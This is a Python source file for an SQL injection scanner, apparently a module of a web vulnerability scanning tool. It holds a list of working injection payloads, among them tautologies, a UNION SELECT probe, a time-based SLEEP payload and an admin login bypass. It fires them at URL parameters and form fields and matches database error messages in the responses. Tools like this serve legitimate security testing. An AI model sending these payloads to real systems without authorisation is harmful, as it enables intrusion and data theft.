from utils.colors import Colors

class SQLiScanner:
    def __init__(self, requester, reporter):
        self.req = requester
        self.reporter = reporter
        self.payloads = [
            "'", "\"", "' OR 1=1--", "' OR '1'='1",
            "' UNION SELECT 1,2,3--",
            "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
            "admin' --",
            "' OR 1=1 LIMIT 1-- -"
        ]
        self.errors = [
            "you have an error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
            "sql syntax"
        ]

    def is_vulnerable(self, response_text):
        response_lower = response_text.lower()
        for error in self.errors:
            if error in response_lower:
                return True
        return False

    def scan_url(self, url):
        if "?" not in url:
            return False
            
        for payload in self.payloads:
            test_url = url + payload
            response = self.req.get(test_url)
            if response and self.is_vulnerable(response.text):
                print(f"{Colors.VULN} SQL Injection found at URL: {test_url}")
                self.reporter.add_vulnerability("SQL Injection (GET)", test_url, f"Payload: {payload}")
                return True
        return False

    def scan_form(self, form):
        target_url = form['action']
        method = form['method']
        
        for payload in self.payloads:
            data = {}
            for input_tag in form['inputs']:
                input_name = input_tag['name']
                data[input_name] = payload
            
            if method == 'post':
                response = self.req.post(target_url, data=data)
            else:
                response = self.req.get(target_url, params=data)
                
            if response and self.is_vulnerable(response.text):
                print(f"{Colors.VULN} SQL Injection found in Form at: {form['url']}")
                self.reporter.add_vulnerability("SQL Injection (Form)", form['url'], f"Payload: {payload} | Data: {data}")
                return True
        return False